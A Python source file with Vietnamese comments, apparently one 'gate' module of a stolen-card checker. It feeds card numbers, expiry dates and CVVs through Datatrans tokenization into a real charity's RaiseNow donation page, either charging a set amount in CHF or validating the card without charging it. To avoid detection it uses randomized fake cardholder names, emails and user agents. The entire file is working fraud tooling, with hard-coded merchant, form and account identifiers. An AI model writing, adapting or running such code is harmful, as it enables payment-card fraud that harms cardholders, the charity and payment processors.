import time
import requests
import json
import random
import string
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

# --- CÁC HÀM TIỆN ÍCH (SAO CHÉP TỪ CÁC GATE KHÁC) ---

def generate_random_string(length=8):
    """Tạo một chuỗi ký tự ngẫu nhiên."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Tạo một địa chỉ email ngẫu nhiên."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    """Tạo một chuỗi User-Agent thực tế ngẫu nhiên (y hệt gate 1)."""
    chrome_major = random.randint(100, 138)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = "10.0; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    """Thực hiện request với cơ chế thử lại."""
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            if cancellation_event:
                if cancellation_event.wait(wait_time):
                    return None, "Operation cancelled by user"
            else:
                import time
                time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- LOGIC CHÍNH CỦA GATE 13 ---

def check_card_gate13(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate13_mode, _get_charge_value, custom_charge_amount=None):
    """
    Logic for Gate 13: Dựa trên payload bạn cung cấp.
    """
    gate13_mode = get_gate13_mode()
    
    try:
        # --- Tạo dữ liệu ngẫu nhiên ---
        user_agent = random_user_agent()
        # Yêu cầu mới: random tên từ 20 đến 30 ký tự
        first_name = generate_random_string(random.randint(20, 30))
        last_name = generate_random_string(random.randint(20, 30))
        cardholder = f"{first_name} {last_name}"
        email = random_email()

        # --- Bước 1: Lấy Token cho thẻ ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "pay.datatrans.com",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250809051441568497", # formId bạn cung cấp
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877", # Merchant ID chuẩn
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # --- Bước 2: Thực hiện request dựa trên chế độ ---
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }

        # Payload cơ bản từ thông tin bạn cung cấp
        base_payload = {
            "account_uuid": "badda322-5bcf-42a0-b48f-65309d12ad64",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "fr",
                "first_name": first_name, # Thay thế bằng tên random
                "last_name": last_name    # Thay thế bằng tên random
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "5000",
                    "suggested_amounts": "[5000,10000,15000]",
                    "user_agent": user_agent # Thay thế bằng UA random
                },
                "solution": {
                    "uuid": "2d4777ad-c6d8-468b-840b-db29de3990ed",
                    "name": "Fundraising",
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/kmmjt?lng=fr",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {
                    "donation_receipt_requested": "false"
                }
            },
            "custom_parameters": {
                "campaign_id": "Fundraising",
                "campaign_subid": "Spenden"
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,         # Thay thế bằng tên random
                "expiry_month": mes.zfill(2),   # Thay thế bằng tháng từ input
                "expiry_year": ano,             # Thay thế bằng năm từ input
                "transaction_id": transaction_id  # Thay thế bằng ID từ Bước 1
            },
            "profile": "4c12f4a1-45f6-407c-a567-1dbf55a21cdc",
            "return_url": "https://donate.raisenow.io/kmmjt?lng=fr&rnw-view=payment_result"
        }

        # --- CHẾ ĐỘ CHARGE ---
        if gate13_mode == 'charge':
            charge_value = _get_charge_value('13', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": charge_value} # Đơn vị tiền tệ là CHF

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            # Logic check key chuẩn
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- CHẾ ĐỘ LIVE CHECK ---
        else: # 'live' mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            # Live mode cần một giá trị amount để xác thực, nhưng sẽ không bị charge
            payment_payload["amount"] = {"currency": "CHF", "value": 50} 

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            # Logic check key chuẩn
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 13 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 13 System Error: {e}", bin_info
